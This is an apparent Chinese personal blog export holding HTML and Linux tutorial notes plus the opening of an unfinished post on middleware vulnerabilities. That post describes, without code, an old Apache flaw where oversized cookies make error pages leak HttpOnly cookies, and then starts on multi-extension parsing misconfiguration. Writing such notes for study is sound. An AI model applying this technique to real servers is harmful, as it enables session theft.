属性值应该始终被包括在引号内。
双引号是最常用的，不过使用单引号也没有问题。
在某些个别的情况下，比如属性值本身就含有双引号，那么您必须使用单引号

例如：
name=&#x27;John &quot;ShotGun&quot; Nelson&#x27;

注意：

属性和属性值，尽量小写，本来这样做也方便些。
class 属性可以多用 class=&quot; &quot; （引号里面可以填入多个class属性）
id 属性只能单独设置 **id=&quot; &quot;**（只能填写一个，多个无效）

大多数 HTML 元素的属性：



属性
目的和用途
可使用的元素



class
可以用于选择和样式化元素。可以在 CSS 中使用类选择器来选择具有特定类名的元素，并应用样式规则。
适用于大多数 HTML 元素，如&lt;div&gt;, &lt;p&gt;, &lt;span&gt;, &lt;h1&gt;, 等等


id
用于为元素指定唯一的标识符。可以使用 JavaScript 或 CSS 来选择具有特定 id 的元素，并对其进行操作或样式化。
适用于大多数 HTML 元素，如&lt;div&gt;, &lt;p&gt;, &lt;span&gt;, &lt;h1&gt;, 等等


style
内联样式
适用于大多数 HTML 元素，如&lt;div&gt;, &lt;p&gt;, &lt;span&gt;, &lt;h1&gt;, 等等


src
指定外部资源的 URL
&lt;img&gt;, &lt;script&gt;, &lt;iframe&gt;, &lt;video&gt;, &lt;audio&gt;, 等等


href
用于创建超链接,指定链接的 URL
&lt;a&gt;, &lt;link&gt;, &lt;area&gt;, 等等


alt
为图像元素提供替代文本。当图像无法加载或无法显示时，浏览器会显示 alt 属性中的文本。
&lt;img&gt;


width
元素的宽度
&lt;img&gt;, &lt;canvas&gt;, &lt;video&gt;, &lt;audio&gt;, &lt;table&gt;, 等等


height
元素的高度
&lt;img&gt;, &lt;canvas&gt;, &lt;video&gt;, &lt;audio&gt;, &lt;table&gt;, 等等


disabled
禁用元素，例如，可以将按钮元素 (&lt;button&gt;) 的 disabled 属性设置为 true，以禁用按钮，防止用户点击它。
&lt;button&gt;, &lt;input&gt;, &lt;select&gt;, &lt;textarea&gt;, 等等


readonly
将元素设置为只读
&lt;input&gt;, &lt;textarea&gt;, 等等


placeholder
输入字段的占位符文本
&lt;input&gt;, &lt;textarea&gt;, 等等


required
设置元素为必填
&lt;input&gt;, &lt;select&gt;, &lt;textarea&gt;, 等等


value
元素的值
&lt;input&gt;, &lt;button&gt;, &lt;option&gt;, &lt;textarea&gt;, 等等


checked
设置复选框或单选按钮的选中状态
&lt;input type=&quot;checkbox&quot;&gt;, &lt;input type=&quot;radio&quot;&gt;, 等等


maxlength
输入字段的最大字符数
&lt;input&gt;, &lt;textarea&gt;, 等等


min, max
输入字段的最小值和最大值
&lt;input type=&quot;number&quot;&gt;, &lt;input type=&quot;date&quot;&gt;, &lt;input type=&quot;time&quot;&gt;, 等等


placeholder
为输入字段提供占位符文本，用于提示用户输入的内容。例如，您可以在文本输入字段 (&lt;input type=&quot;text&quot;&gt;) 中使用 placeholder 属性来提供示例输入。
&lt;input type=&quot;text&quot;&gt;


HTML 头部&lt;head&gt; 元素包含了所有的头部标签元素。在 &lt;head&gt;元素中你可以插入脚本（scripts）, 样式文件（CSS），及各种meta信息。
可以添加在头部区域的元素标签为: &lt;title&gt;, &lt;style&gt;, &lt;meta&gt;, &lt;link&gt;, &lt;script&gt;, &lt;noscript&gt; 和 &lt;base&gt;。
&lt;title&gt; 元素&lt;title&gt; 标签定义了不同文档的标题。&lt;title&gt; 在 HTML&#x2F;XHTML 文档中是必需的。

定义了浏览器工具栏的标题
当网页添加到收藏夹时，显示在收藏夹中的标题
显示在搜索引擎结果页面的标题

HTML&lt;title&gt;元素不仅可以显示文本，也可以在左侧显示logo等图片。显示时，要将&lt;link&gt;标签放入&lt;head&gt;里。
&lt;base&gt; 元素&lt;base&gt; 标签描述了基本的链接地址&#x2F;链接目标，该标签作为HTML文档中所有的链接标签的默认链接:
&lt;head&gt; &lt;base href=&quot;http://www.runoob.com/images/&quot; target=&quot;_blank&quot;&gt; &lt;/head&gt;



&lt;link&gt; 元素&lt;link&gt; 标签定义了文档与外部资源之间的关系。
&lt;link&gt; 标签通常用于链接到样式表:
&lt;head&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;mystyle.css&quot;&gt; &lt;/head&gt;



&lt;style&gt; 元素&lt;style&gt; 标签定义了HTML文档的样式文件引用地址.

在&lt;style&gt; 元素中你也可以直接添加样式来渲染 HTML 文档:
&lt;head&gt; &lt;style type=&quot;text/css&quot;&gt; body &#123;    background-color:yellow; &#125; p &#123;    color:blue &#125; &lt;/style&gt; &lt;/head&gt;



&lt;meta&gt; 元素meta标签描述了一些基本的元数据。元数据也不显示在页面上，但会被浏览器解析。元数据可以使用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他Web服务。META 元素通常用于指定网页的描述，关键词，文件的最后修改时间，作者，和其他元数据。
&lt;meta&gt; 一般放置于 &lt;head&gt; 区域
 使用实例
为搜索引擎定义关键词:
&lt;meta name=&quot;keywords&quot; content=&quot;HTML, CSS, XML, XHTML, JavaScript&quot;&gt;

为网页定义描述内容:
&lt;meta name=&quot;description&quot; content=&quot;免费 Web &amp; 编程 教程&quot;&gt;

定义网页作者:
&lt;meta name=&quot;author&quot; content=&quot;Runoob&quot;&gt;

每30秒钟刷新当前页面:
&lt;meta http-equiv=&quot;refresh&quot; content=&quot;30&quot;&gt;



HTML &lt;script&gt; 元素&lt;script&gt;标签用于加载脚本文件，如： JavaScript。
链接HTML 链接是通过标签 &lt;a&gt; 来定义的。
超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。
语法以下是 HTML 中创建链接的基本语法和属性：code&gt;&lt;a&gt; 元素：创建链接的主要HTML元素是&lt;a&gt;（锚）元素。&lt;a&gt;元素具有以下属性：

href：指定链接目标的URL，这是链接的最重要属性。可以是另一个网页的URL、文件的URL或其他资源的URL。
target（可选）：指定链接如何在浏览器中打开。常见的值包括 _blank（在新标签或窗口中打开链接）和 _self（在当前标签或窗口中打开链接）。
title（可选）：提供链接的额外信息，通常在鼠标悬停在链接上时显示为工具提示。
rel（可选）：指定与链接目标的关系，如 nofollow、noopener 等。

使用实例文本链接：最常见的链接类型是文本链接，它使用 &lt;a&gt; 元素将一段文本转化为可点击的链接，例如：
&lt;a href=&quot;https://www.example.com&quot;&gt;访问示例网站&lt;/a&gt;

图像链接：您还可以使用图像作为链接。在这种情况下，&lt;a&gt; 元素包围着 &lt;img&gt; 元素。例如：
&lt;a href=&quot;https://www.example.com&quot;&gt;  &lt;img src=&quot;example.jpg&quot; alt=&quot;示例图片&quot;&gt;&lt;/a&gt;

锚点链接：除了链接到其他网页外，您还可以在同一页面内创建内部链接，这称为锚点链接。要创建锚点链接，需要在目标位置使用 &lt;a&gt; 元素定义一个标记，并使用#符号引用该标记。例如：
&lt;a href=&quot;#section2&quot;&gt;跳转到第二部分&lt;/a&gt;&lt;!-- 在页面中的某个位置 --&gt;&lt;a name=&quot;section2&quot;&gt;&lt;/a&gt;

下载链接：如果您希望链接用于下载文件而不是导航到另一个网页，可以使用 download 属性。例如：
&lt;a href=&quot;document.pdf&quot; download&gt;下载文档&lt;/a&gt;

跳转id链接 
id 属性可用于创建一个 HTML 文档书签。
提示: 书签不会以任何特殊方式显示，即在 HTML 页面中是不显示的，所以对于读者来说是隐藏的。
在HTML文档中创建一个链接到”有用的提示部分(id&#x3D;”tips”）”：
&lt;a href=&quot;#tips&quot;&gt;访问有用的提示部分&lt;/a&gt;

或者，从另一个页面创建一个链接到”有用的提示部分(id&#x3D;”tips”）”：
&lt;a href=&quot;https://www.runoob.com/html/html-links.html#tips&quot;&gt;访问有用的提示部分&lt;/a&gt;

邮箱链接
&lt;--案例1 --&gt;&lt;/--&gt;&lt;a href=&quot;mailto:someone@example.com?Subject=Hello%20again&quot; target=&quot;_top&quot;&gt; &lt;--案例2 --&gt;&lt;/--&gt;&lt;a href=&quot;mailto:someone@example.com?cc=someoneelse@example.com&amp;bcc=andsomeoneelse@example.com&amp;subject=Summer%20Party&amp;body=You%20are%20invited%20to%20a%20big%20summer%20party!&quot; target=&quot;_top&quot;&gt;发送邮件!&lt;/a&gt;

案例2可设置指定的收件内容以及内容
图像HTML 图像是通过标签 &lt;img&gt; 来定义的.&lt;img&gt; 是空标签，意思是说，它只包含属性，并且没有闭合标签。
语法&lt;img src=&quot;url&quot; alt=&quot;some_text&quot;&gt;

Alt属性alt 属性用来为图像定义一串预备的可替换的文本。
替换文本属性的值是用户定义的。
&lt;img src=&quot;boat.gif&quot; alt=&quot;Big Boat&quot;&gt;

在浏览器无法载入图像时，此时，浏览器将显示这个替代性的文本而不是图像。
设置图像的高度与宽度height（高度） 与 width（宽度）属性用于设置图像的高度与宽度。
属性值默认单位为像素:
&lt;img src=&quot;pulpit.jpg&quot; alt=&quot;Pulpit rock&quot; width=&quot;304&quot; height=&quot;228&quot;&gt;

实例：
&lt;img src=&quot;https://hijwei.top/images/redefine-avatar.jpg&quot; alt=&quot;cola&quot; width=&quot;39&quot; height=&quot;39&quot; /&gt;

实现效果




表格HTML 表格由 &lt;table&gt; 标签来定义。HTML 表格是一种用于展示结构化数据的标记语言元素。
&lt;table&gt; 元素表示整个表格，它包含两个主要部分：&lt;thead&gt; 和 &lt;tbody&gt;。

&lt;thead &gt; 用于定义表格的标题部分: 在 &lt;thead &gt; 中，使用 &lt;th &gt; 元素定义列的标题，以上实例中列标题分别为”列标题1”，”列标题2”和”列标题3”。
&lt;tbody &gt; 用于定义表格的主体部分: 在 &lt;tbody &gt; 中，使用 &lt;tr &gt; 元素定义行，并在每行中使用 &lt;td &gt; 元素定义单元格数据，以上实例中有两行数据，每行包含三个单元格。

每个表格均有若干行（由 &lt;tr&gt; 标签定义），每行被分割为若干单元格（由 &lt;td&gt; 标签定义），表格可以包含标题行（**&lt;th&gt;**）用于定义列的标题。

tr：tr 是 table row 的缩写，表示表格的一行。
td：td 是 table data 的缩写，表示表格的数据单元格。
th：th 是 table header的缩写，表示表格的表头单元格。

数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等等。
表格和边框属性如果不定义边框属性，表格将不显示边框。有时这很有用，但是大多数时候，我们希望显示边框。使用边框属性来显示一个带有边框的表格table后面加入border=&quot;1&quot;
列表列表项内部可以使用段落、换行符、图片、链接以及其他列表等等。
无序列表无序列表是一个项目的列表，此列项目使用粗体圆点（典型的小黑圆圈）进行标记。
无序列表使用 &lt;ul&gt; 标签
有序列表同样，有序列表也是一列项目，列表项目使用数字进行标记。 有序列表始于 &lt;ol&gt; 标签。每个列表项始于 &lt;li&gt; 标签。
列表项使用数字来标记。
自定义列表自定义列表不仅仅是一列项目，而是项目及其注释的组合。自定义列表以 &lt;dl&gt; 标签开始。每个自定义列表项以 &lt;dt&gt; 开始。每个自定义列表项的定义以 &lt;dd&gt; 开始。
HTML 区块区块元素和内联元素HTML 区块元素大多数 HTML 元素被定义为块级元素或内联元素。
块级元素在浏览器显示时，通常会以新行来开始（和结束）。
实例: &lt;div&gt;、&lt;h1&gt;, &lt;p&gt;, &lt;ul&gt;, &lt;table&gt;
HTML 内联元素内联元素在显示时通常不会以新行开始。
实例: &lt;span&gt;,&lt;b&gt;, &lt;td&gt;, &lt;a&gt;, &lt;img&gt;
&lt;div&gt;与 &lt;span&gt;
&lt;div&gt; 是块级元素，它独占一行，可以设置宽度、高度以及边距等样式属性。它适合用于创建页面的大块结构，例如页面的主体区域、容器、布局等。
&lt;span&gt; 是行内元素，它不会独占一行，宽度默认由其内容决定。它适合用于对文本或其他行内元素进行样式化、标记或包裹。
嵌套关系：

&lt;div&gt; 可以容纳其他块级元素和行内元素，包括其他的 &lt;div&gt; 和 &lt;span&gt; 元素。
&lt;span&gt;通常被用来包裹文本或其他行内元素，比如用来设置特定文本的样式。

表单和输入HTML 表单用于收集用户的输入信息。
表单元素是允许用户在表单中输入内容，比如：文本域（textarea）、下拉列表（select）、单选框（radio-buttons）、复选框（checkbox） 等等。
我们可以使用 &lt;form&gt; 标签来创建表单:
HTML 表单 - 输入元素多数情况下被用到的表单标签是输入标签 **&lt;input&gt;**。输入类型是由type属性定义。接下来我们介绍几种常用的输入类型。
文本域文本域通过 &lt;input type=&quot;text&quot;&gt; 标签来设定，当用户要在表单中键入字母、数字等内容时，就会用到文本域。
&lt;form&gt;First name: &lt;input type=&quot;text&quot; name=&quot;firstname&quot;&gt;&lt;br&gt;Last name: &lt;input type=&quot;text&quot; name=&quot;lastname&quot;&gt;&lt;/form&gt;

注意:表单本身并不可见。同时，在大多数浏览器中，文本域的默认宽度是 20 个字符。
密码字段密码字段通过标签 &lt;input type=&quot;password&quot;&gt; 来定义:
&lt;form&gt;Password: &lt;input type=&quot;password&quot; name=&quot;pwd&quot;&gt;&lt;/form&gt;

注意：密码字段字符不会明文显示，而是以星号 ***** 或圆点 . 替代。
单选按钮&lt;input type=&quot;radio&quot;&gt; 标签定义了表单的单选框选项:
&lt;form action=&quot;&quot;&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;male&quot;&gt;男&lt;br&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;female&quot;&gt;女&lt;/form&gt;

复选框&lt;input type=&quot;checkbox&quot;&gt; 定义了复选框。
复选框可以选取一个或多个选项：
&lt;form&gt;&lt;input type=&quot;checkbox&quot; name=&quot;vehicle&quot; value=&quot;Bike&quot;&gt;我喜欢自行车&lt;br&gt;&lt;input type=&quot;checkbox&quot; name=&quot;vehicle&quot; value=&quot;Car&quot;&gt;我喜欢小汽车&lt;/form&gt;

提交按钮&lt;input type=&quot;submit&quot;&gt; 定义了提交按钮。
当用户单击确认按钮时，表单的内容会被传送到服务器。表单的动作属性 action 定义了服务端的文件名。action 属性会对接收到的用户输入数据进行相关的处理:
&lt;form name=&quot;input&quot; action=&quot;html_form_action.php&quot; method=&quot;get&quot;&gt;Username: &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;/form&gt;



框架iframe语法:
&lt;iframe src=&quot;URL&quot;&gt;&lt;/iframe&gt;

该URL指向不同的网页。
iframe - 设置高度与宽度height 和 width 属性用来定义iframe标签的高度与宽度。
属性默认以像素为单位, 但是你可以指定其按比例显示 (如：”80%”)。
&lt;iframe src=&quot;demo_iframe.htm&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;/iframe&gt;

iframe - 移除边框frameborder 属性用于定义iframe表示是否显示边框。
设置属性值为 “0” 移除iframe的边框:
&lt;iframe src=&quot;demo_iframe.htm&quot; frameborder=&quot;0&quot;&gt;&lt;/iframe&gt;

使用 iframe 来显示目标链接页面iframe 可以显示一个目标链接的页面
目标链接的属性必须使用 iframe 的属性，如下实例:
&lt;iframe src=&quot;demo_iframe.htm&quot; name=&quot;iframe_a&quot;&gt;&lt;/iframe&gt; &lt;p&gt;&lt;a href=&quot;https://1.top&quot; target=&quot;iframe_a&quot; rel=&quot;noopener&quot;&gt;HIJWEI.TOP&lt;/a&gt;&lt;/p&gt;



文章引用1.引用菜鸟教程的文章    原文链接：https://www.runoob.com/html/html-tutorial.html
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux笔记</title>
    <url>/posts/1406167115/</url>
    <content><![CDATA[用户管理创建指令通常是useradd或adduser

使用useradd命令：sudo useradd 选项 用户名


选项:
-c comment 指定一段注释性描述。
-d 目录 指定用户主目录（如果已存在）。如果此目录不存在，则同时使用-m选项，可以创建主目录。如：sudo useradd –d  /home/sam -m sam
-g 用户组 指定用户所属的用户组。
-G 用户组，用户组 指定用户所属的附加组。
-s Shell文件 指定用户的登录Shell。
-u 用户号 指定用户的用户号，如果同时有-o选项，则可以重复使用其他用户的标识号。




使用adduser命令：sudo adduser 用户名

创建用户后，系统会自动为该用户分配一个默认的主目录和用户组。
设置密码passwd命令：
sudo passwd 选项 用户名

选项：

-l 锁定口令，即禁用账号。
-u 口令解锁。
-d 使账号无口令。
-f 强迫用户下次登录时修改口令。

修改帐号usermod命令，其格式如下：
usermod 选项 用户名

常用的选项包括-c, -d, -m, -g, -G, -s, -u以及-o等，这些选项的意义与useradd命令中的选项一样，可以为用户指定新的资源值。
另外，有些系统可以使用选项：-l 新用户名
这个选项指定一个新的账号，即将原来的用户名改为新的用户名。
删除帐号userdel命令，其格式如下：
userdel 选项 用户名

常用的选项是 -r，它的作用是把用户的主目录一起删除。
用户组管理增加用户组groupadd命令：
groupadd 选项 用户组

选项：

-g GID 指定新用户组的组标识号（GID）。
-o 一般与-g选项同时使用，表示新用户组的GID可以与系统已有用户组的GID相同。

删除用户组groupdel命令
groupdel 用户组

修改用户组groupmod命令
groupmod 选项 用户组

选项：

-g GID 为用户组指定新的组标识号。
-o 与-g选项同时使用，用户组的新GID可以与系统已有用户组的GID相同。
-n新用户组 将用户组的名字改为新名字

用户在用户组之间切换newgrp命令
newgrp root

（前提条件是root用户组确实是该用户的主组或附加组）这条命令将当前用户切换到root用户组，
权限控制授予用户sudo权限用户到sudo用户组：

在某些Linux发行版中，可以将用户添加到sudo用户组来赋予其sudo权限。

使用以下命令将用户添加到sudo用户组：
sudo usermod -aG sudo 用户名

文件权限文件权限位包括读取（read）、写入（write）和执行（execute）权限。

读取权限（r）允许用户查看文件内容和属性。
写入权限（w）允许用户修改文件内容和属性。
执行权限（x）允许用户以可执行文件的形式运行文件（例如，脚本或可执行程序）或进入目录。

每个文件都有三组权限位，分别对应文件的所有者、用户组和其他用户。
更改文件权限 chmod 命令可以更改文件的权限
数字模式：可以使用三个八进制数字（0-7）来表示权限位。每个数字代表一个权限组，分别表示所有者、用户组和其他用户的权限。

每个权限位用一个数字表示，对应的值为：
r：4             w：2               x：1                   -：0


将三个权限位的数字相加，得到一个三位数，例如：
rwx：4 + 2 + 1 &#x3D; 7
rw-：4 + 2 + 0 &#x3D; 6
r–：4 + 0 + 0 &#x3D; 4
—：0 + 0 + 0 &#x3D; 0



符号模式：可以使用 +、- 和 = 符号来添加、移除或设置权限。符号前表示用户u（所有者）、g（用户组）、o（其他用户）、a（所有用户），后表示所操作的权限。

给予读取权限：
给予所有者读取权限：chmod u+r 文件名
给予用户组读取权限：chmod g+r 文件名
给予其他用户读取权限：chmod o+r 文件名
给予所有用户（包括所有者、用户组和其他用户）读取权限：chmod a+r 文件名


给予写入权限：
给予所有者写入权限：chmod u+w 文件名
给予用户组写入权限：chmod g+w 文件名
给予其他用户写入权限：chmod o+w 文件名
给予所有用户写入权限：chmod a+w 文件名


给予执行权限：
给予所有者执行权限：chmod u+x 文件名
给予用户组执行权限：chmod g+x 文件名
给予其他用户执行权限：chmod o+x 文件名
给予所有用户执行权限：chmod a+x 文件名



远程登录Linux 系统中是通过 ssh 服务实现的远程登录功能，默认 ssh 服务端口号为 22
第一种级别（基于口令的安全验证）：只要你知道自己帐号和口令，就可以登录到远程主机。
第二种级别（基于密钥的安全验证）：你必须为自己创建一对密钥，并把公钥放在需要访问的服务器上。
密钥连接1.生成ssh key的文件windows 用户可以使用 WSL，或使用 Git Bash进行执行命令
ssh-keygen 命令
ssh-keygen 参数

可选参数：

-t：指定密钥类型。常见的选项包括 rsa、dsa、ecdsa 和 ed25519。默认为 rsa。
-b：指定密钥位数。默认为 2048 位。常见的选项包括 1024、2048、4096。
-C：添加注释。可以在生成的公钥文件中添加一段注释，用于标识该密钥的用途或所有者等信息。
-f：指定生成的密钥文件名。可以自定义密钥文件的名称和路径。
-N：设置密码短语（passphrase）。可以为私钥文件设置密码短语，以增加安全性。
-q：静默模式。生成密钥时不显示进度或警告信息。
-y：从私钥文件中提取公钥。可以使用私钥文件生成对应的公钥文件。

XiaoWei@XiaoWEI MINGW64 ~/.ssh$ ssh-keygen -t rsa -b 4096 -f aliyun_rsaGenerating public/private rsa key pair.Enter passphrase (empty for no passphrase):  //如果不想在之后登录的时候还需要输入密码请直接回车Enter same passphrase again:   //如果不想在之后登录的时候还需要输入密码请直接回车Your identification has been saved in aliyun_rsaYour public key has been saved in aliyun_rsa.pub

注意：
密钥用于鉴权，请谨慎保管。公钥文件以 .pub 扩展名结尾，可以公开给其他人，而没有 .pub 扩展名的私钥文件不要泄露给任何人！
2.部署公钥到服务器
创建 SSH 目录和授权文件：在目标服务器上，如果尚未存在，请创建 .ssh 目录，并将其权限设置为 700：
mkdir -p ~/.sshchmod 700 ~/.ssh

添加公钥到授权文件：将公钥粘贴到服务器上的 ~/.ssh/authorized_keys 文件中。如果该文件不存在，请创建它，并将其权限设置为 600：
vim ~/.ssh/authorized_keyschmod 600 ~/.ssh/authorized_keys

保存并退出：保存对 authorized_keys 文件的更改，并退出服务器。


3.更改配置文件有些Linux可能默认禁止ssl的密钥登录

SSH 配置文件位于 /etc/ssh/sshd_config，可使用以下命令进行配置
sudo vi /etc/ssh/sshd_config

如果您只想更改用户级别的 SSH 配置，可以编辑 ~/.ssh/config 文件。

在配置文件中，常见的 SSH 配置选项：

Port：指定 SSH 服务器监听的端口号。
PermitRootLogin：允许或禁止使用 root 用户进行 SSH 登录。
PasswordAuthentication：允许或禁止使用密码进行身份验证。
PubkeyAuthentication：允许或禁止使用公钥进行身份验证。
AllowUsers 或 AllowGroups：限制允许登录的用户或组。
DenyUsers 或 DenyGroups：禁止登录的用户或组。
PrintMotd：显示登录时的欢迎信息。
Banner：指定自定义的登录横幅文件。



4.本机ssh的config设置（快捷登录）Host 名称(自己决定，方便输入记忆的)    HostName 主机名 #172.16.8.152    User root # SSH 连接的用户名    # Port 29172 端口 默认22    # PreferredAuthentications publickey,password  # 选项publickey/password/publickey,password  设置首选的身份验证方法，先尝试公钥验证，然后尝试密码验证    # IdentityFile ~/.ssh/work_id_rsa  # 使用的身份验证密钥文件路径    # ForwardAgent yes  # 启用 SSH 代理转发    # ForwardX11 yes  # 启用 X11 转发    # Compression yes  # 启用连接压缩    # StrictHostKeyChecking yes  # 设置主机密钥检查级别为严格检查    # LogLevel VERBOSE  # 设置 SSH 客户端的日志级别为详细模式    # ServerAliveInterval 60  # 设置 SSH 连接的保活机制，每60秒发送保活消息    # ServerAliveCountMax 3  # 设置 SSH 连接的保活机制，最多发送3个保活消息    # ProxyJump jumpbox  # 使用跳板机（代理主机）访问目标主机



软件安装
Ubuntu&#x2F;Debian:
使用APT包管理器：
安装软件：sudo apt-get install 软件名称
卸载软件：sudo apt-get remove 软件名称
更新软件包列表：sudo apt-get update
升级已安装的软件包：sudo apt-get upgrade




CentOS&#x2F;RHEL&#x2F;Fedora:
使用YUM包管理器：
安装软件：sudo yum install 软件名称
卸载软件：sudo yum remove 软件名称
更新软件包列表：sudo yum update
升级已安装的软件包：sudo yum upgrade




Alpine Linux:
使用apk包管理器：

安装软件：apk add 软件名称

卸载软件：apk del 软件名称

更新软件包列表：apk update

升级已安装的软件包：apk upgrade






常用命令前置知识1.目录符号 / 表示从 根目录
~表示从 家目录(即&#x2F;home&#x2F;用户名，root用户为/root)
. 代表当前目录
.. 代表上一级目录
2.绝对目录与相对目录相对路径 在输入路径时，使用.或者..，表示相对 当前目录 所在的目录位置 
绝对路径 在输入路径时，最前面是 &#x2F; 或者 ~，表示从 根目录&#x2F;家目录 开始的具体目录位置，特点：需要写入完整地址
3.&gt; 和 &gt;&gt;重定向 命令功能：将命令执行结果重定向到一个文件，将本应显示在终端上的内容 输出或追加 到指定文件中
 &gt; 表示输出，会覆盖文件原有的内容 
&gt;&gt; 表示追加，会将内容追加到已有文件的末尾
4.|管道符
Linux 允许将 一个命令的输出 可以通过管道| 做为 另一个命令的输入
这里 | 的左右分为两端， 左端塞东西（写），右端取东西（读）

pwd 命令对应单词：print working directory
功能：打印当前工作目录
ls 命令对应单词：list
功能：列出目录的内容或者使用通配符列出文件名匹配的文件
格式:
ls [参数]

可选参数



-a
显示指定目录下所有目录与文件，包括隐藏文件



-l
以列表方式显示文件的详细信息


-h
配合 -l 以人性化的方式显示文件大小


注意：以 . 开头的文件为隐藏文件，需要用 -a 参数才能显示
find 命令对应单词：find
功能：指定目录及其子目录下查找文件和目录
格式
find [路径] [匹配条件] [动作]

常用的匹配条件：



可选匹配条件
作用



-name
按文件名查找，支持使用通配符 * 和 ?


-type
按文件类型查找，可以是 f（普通文件）、d（目录）、l（符号链接）等。


-size[+-]
按文件大小查找，支持使用 + 或 - 表示大于或小于指定大小，单位可以是 c（字节）、w（字数）、b（块数）、k（KB）、M（MB）或 G（GB）。


-mtime
按修改时间查找，支持使用 + 或 - 表示在指定天数前或后，days 是一个整数表示天数。


-user
按文件所有者查找。


-group
按文件所属组查找。


cd 命令对应单词：change directory
功能：更改当前的工作目录
格式:
cd 目录

cd搭配符号



命令
含义



cd  &#x2F;cd ~
切换到当前用户的主目录(&#x2F;home&#x2F;用户目录)


cd .
保持在当前目录不变


cd ..
切换到上级目录


cd –
可以在最近两次工作目录之间来回切换


touch命令功能：

如果文件不存在，可以创建一个空白文件 
如果文件已经存在，可以修改文件的末次修改日期

mkdir命令对应单词：make directory
功能：创建一个新的目录



选项
含义



-p
创建多级目录需要创建一个目录的同时，也需要创建其上级目录（如果上级目录不存在）


注意：新建目录的名称 不能与当前目录中 已有的目录同名
rm命令对应单词：remove
功能：删除文件或目录



可选参数
含义



-f
强制删除，忽略不存在的文件，无需提示


-r
递归地删除目录下的内容，删除文件夹时必须加此参数


cp命令对应单词：copy
功能：复制文件或者目录



可选参数
含义



-i
覆盖文件前提示


-r
若给出的源文件是目录文件，则 cp 将递归复制该目录下的所有子目录和文件，目标文件必须为一个目录名


mv命令对应单词：move
功能：移动文件或者目录／文件或者目录重命名



可选参数
含义



-i
覆盖文件前提示


cat命令对应单词：  concatenate
功能：查看文件内容、创建文件、文件合并、追加文件内容等功能.,适合查看内容较少的文本文件



可选参数
含义



-b
对非空输出行编号


-n
对输出的所有行编号


more命令对应单词：  more
功能：  分屏显示文件内容
使用 more 的操作键：



操作键
功能



空格键
显示手册页的下一屏


Enter
键 一次滚动手册页的一行


b
回滚一屏


f
前滚一屏


q
退出


&#x2F;word
搜索 word 字符串


echo命令对应单词：  more
功能：  在终端中显示参数指定的文字，通常会和重定向联合使用
进程命令ps命令：英文：  process status 
作用：显示当前正在运行的进程的快照。



命令
作用



ps aux
查看进程的详细状况


ps -ef
显示所有进程的完整信息


ps 进程代号
显示特定进程代号的详细信息


top



kill [-9] 进程代号
终止指定代号的进程， -9 表示强行终止


ps 默认只会显示当前用户通过终端启动的应用程序 ps 选项说明



选项
含义



a
显示终端上的所有进程，包括其他用户的进程


u
显示进程的详细状态


x
显示没有控制终端的进程


top命令：作用：  动态显示运行中的进程并且可以按 CPU 使用率、内存使用率等对进程进行排序
输入 q退出 top 命令界面
kill命令：作用：  向进程发送信号以终止或操作进程
常见用法



命令
作用



kill 进程代号
向指定进程代号的进程发送默认的终止信号


kill -9 进程代号
向指定进程代号的进程发送强制终止信号


提示：使用 kill 命令时，最好只终止由当前用户开启的进程，而不要终止 root 身份开启的进程，否则可能导致系统崩溃
pgrep命令：作用：  向进程发送信号以终止或操作进程
pgrep [选项] &lt;进程名称&gt;

其中，&lt;进程名称&gt; 是要匹配的进程名称或模式。可以使用通配符进行模糊匹配。



可选选项
说明



-u &lt;用户名&gt;
根据用户名过滤进程。


-n
仅返回最新的匹配进程的进程 ID。


-x
精确匹配进程名称，不进行模糊匹配。


-d &lt;分隔符&gt;
指定输出的分隔符，默认为换行符。


参考文章
参考菜鸟教程的文章
原文链接：Linux 用户和用户组管理 | 菜鸟教程 (runoob.com)、Linux find 命令 | 菜鸟教程 (runoob.com)

参考腾讯云开发者社区博主全栈程序员站长的文章
原文链接：史上最全的Linux常用命令汇总（超全面！超详细！）收藏这一篇就够了！-腾讯云开发者社区-腾讯云 (tencent.com)


]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>CTF-Web</tag>
      </tags>
  </entry>
  <entry>
    <title>中间件漏洞</title>
    <url>/posts/2304588875/</url>
    <content><![CDATA[施工中
Apache2.0-2.2版本存在个漏洞 CE-2012-0053:
攻击者可通过向网站植人超大的Cookie,令其HTTP头超过Apache的LititRequestFieldSize (最大请求长度，4192字节)，使得Apache返回400错误，状态页中包含了HttpOnly 保护的Cookie。
core - Apache HTTP Server 版本 2.4
Apache解析配置漏洞\多后缀名解析配置漏洞解析配置漏洞简介此漏洞实际为人为的错误配置导致的漏洞，与Apache本身无关。
Apache对于多后缀文件的处理规则是：Files with Multiple Extensions-mod_mime
 对应的翻译 
              
              元数据指扩展名映射到关于语言、内容类型、字符集或编码的信息   原文： metadata (language, content type, character set or encoding) 文件可以有多个扩展名；扩展名的顺序通常是无关紧要的。例如，如果文件 welcome.html.fr 映射到内容类型 text&#x2F;html 和法语，则文件 welcome.fr.html 会映射到完全相同的信息。如果给出了多个映射到相同类型元数据的扩展名，则右边的扩展名将被使用，语言和内容编码除外。例如，如果 .gif 映射到媒体类型 image&#x2F;gif，而 .html 映射到媒体类型 text&#x2F;html，则文件 welcome.gif.html 将与媒体类型 text&#x2F;html 关联。语言和内容编码被视为累积的，因为可以为特定资源分配不止一种语言或编码。例如，文件 welcome.html.en.de 将以 Content-Language: en, de 和 Content-Type: text&#x2F;html 交付。当一个具有多个扩展名的文件同时与媒体类型和处理程序关联时，应该小心处理。这通常会导致请求由与处理程序关联的模块处理。例如，如果 .imap 扩展名映射到处理程序 imap-file（来自 mod_imagemap），而 .html 扩展名映射到媒体类型 text&#x2F;html，则文件 world.imap.html 将同时与 imap-file 处理程序和 text&#x2F;html 媒体类型关联。处理时，将使用 imap-file 处理程序，因此它将被视为一个 mod_imagemap 图像映射文件。如果你希望只有文件名中最后一个点分隔的部分映射到特定的元数据，那么不要使用 Add* 指令。例如，如果你希望文件 